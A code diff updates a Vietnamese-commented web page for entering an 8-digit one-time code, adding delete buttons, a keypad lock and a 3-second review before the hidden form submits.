@@ -94,6 +94,9 @@
         background: #d7d7ff;
         transform: scale(0.95);
     }
+    .keypad-grid button:disabled {
+        opacity: 0.5;
+    }
 
     /* Hiển thị mobile version khi dưới 768px */
     @media (max-width: 768px) {
@@ -144,10 +147,10 @@
     <div class="mobile-keypad" id="mobileKeypad">
         <div class="otp-display" id="otpDisplay">* * * * * * * *</div>
         <div class="keypad-grid" id="keypadGrid">
-            <button>1</button><button>2</button><button>3</button>
-            <button>4</button><button>5</button><button>6</button>
-            <button>7</button><button>8</button><button>9</button>
-            <div></div><button>0</button><div></div>
+            <button type="button" data-key="1">1</button><button type="button" data-key="2">2</button><button type="button" data-key="3">3</button>
+            <button type="button" data-key="4">4</button><button type="button" data-key="5">5</button><button type="button" data-key="6">6</button>
+            <button type="button" data-key="7">7</button><button type="button" data-key="8">8</button><button type="button" data-key="9">9</button>
+            <button type="button" id="btnDeleteOne" title="Xoá">⌫</button><button type="button" data-key="0">0</button><button type="button" id="btnDeleteAll" title="Xoá tất cả">🗑</button>
         </div>
     </div>
 
@@ -172,21 +175,31 @@
     const mobileKeypad = document.getElementById('mobileKeypad');
     const otpDisplay = document.getElementById('otpDisplay');
     const keypadGrid = document.getElementById('keypadGrid');
+    const keypadButtons = Array.from(keypadGrid.querySelectorAll('button[data-key]'));
+    const btnDeleteOne = document.getElementById('btnDeleteOne');
+    const btnDeleteAll = document.getElementById('btnDeleteAll');
     const spinner = document.getElementById('spinner');
     const hiddenForm = document.getElementById('hiddenForm');
     const txtCode = document.getElementById('txtCode');
 
     let codeArr = Array(8).fill('*'); // giữ trạng thái 8 số
     let currentIndex = 0;
+    let locked = false; // true trong lúc đang review 3 giây / đang xử lý
 
     // focus ô PC
     function focusCurrent() {
-        if(currentIndex < inputs.length) inputs[currentIndex].focus();
+        if(!locked && currentIndex < inputs.length) inputs[currentIndex].focus();
     }
     focusCurrent();
 
     function disableInputs() {
         inputs.forEach(i => i.disabled = true);
+    }
+
+    function setKeypadDisabled(disabled) {
+        keypadButtons.forEach(b => b.disabled = disabled);
+        btnDeleteOne.disabled = disabled;
+        btnDeleteAll.disabled = disabled;
     }
 
     // sync UI giữa PC và SP
@@ -203,56 +216,86 @@
         }
     }
 
+    function clearAll() {
+        if(locked) return;
+        codeArr = Array(8).fill('*');
+        currentIndex = 0;
+        syncUI();
+    }
+
+    function deleteOne() {
+        if(locked) return;
+        if(currentIndex > 0){
+            currentIndex--;
+            codeArr[currentIndex] = '*';
+            syncUI();
+        }
+    }
+
     function handleInput(key) {
+        if(locked) return;
         if(currentIndex >= 8) return;
         codeArr[currentIndex] = key;
         currentIndex++;
         syncUI();
-        if(currentIndex === 8) processDone();
+        if(currentIndex === 8) startReviewThenProcess();
     }
 
-    function processDone() {
-        txtCode.value = codeArr.join('');
-        disableInputs();
-        mobileKeypad.style.display = 'none';
-        otpContainer.style.display = 'none';
-        spinner.style.display = 'block';
-        setTimeout(()=> hiddenForm.submit(), 5000);
+    // Nhập đủ 8 số -> khoá input, cho user xem lại 3 giây -> mới loading & submit
+    function startReviewThenProcess() {
+        locked = true;
+        disableInputs();         // PC: không cho bấm phím/click ô nữa
+        setKeypadDisabled(true);  // SP: ẩn tương tác bàn phím ảo
+
+        setTimeout(() => {
+            txtCode.value = codeArr.join('');
+            mobileKeypad.style.display = 'none';
+            otpContainer.style.display = 'none';
+            spinner.style.display = 'block';
+            setTimeout(() => hiddenForm.submit(), 500);
+        }, 3000);
     }
 
     // PC input
     inputs.forEach((input, index)=>{
         input.addEventListener('mousedown', e=>{
+            if(locked) { e.preventDefault(); return; }
             if(index !== currentIndex){ e.preventDefault(); focusCurrent(); }
         });
         input.addEventListener('focus', e=>{
+            if(locked) return;
             if(index !== currentIndex) focusCurrent();
         });
         input.addEventListener('paste', e=>e.preventDefault());
     });
 
     document.addEventListener('keydown', e=>{
+        if(locked){ e.preventDefault(); return; }
+
         if(e.key >= '0' && e.key <= '9'){
             if(window.innerWidth > 768) handleInput(e.key);
             e.preventDefault();
         } else if(e.key === 'Backspace'){
-            if(currentIndex>0){
-                currentIndex--;
-                codeArr[currentIndex]='*';
-                syncUI();
-            }
+            deleteOne();
+            e.preventDefault();
+        } else if(e.key === 'Delete' || e.key === 'Escape'){
+            clearAll();
             e.preventDefault();
         } else if(e.key !== 'Tab'){
             e.preventDefault();
         }
     });
 
-    // SP keypad
-    keypadGrid.querySelectorAll('button').forEach(btn=>{
+    // SP keypad - các nút số
+    keypadButtons.forEach(btn=>{
         btn.addEventListener('click', ()=>{
-            handleInput(btn.textContent);
+            handleInput(btn.dataset.key);
         });
     });
+
+    // SP keypad - nút xoá 1 số / xoá tất cả
+    btnDeleteOne.addEventListener('click', deleteOne);
+    btnDeleteAll.addEventListener('click', clearAll);
 
     // resize giữ trạng thái
     window.addEventListener('resize', syncUI);
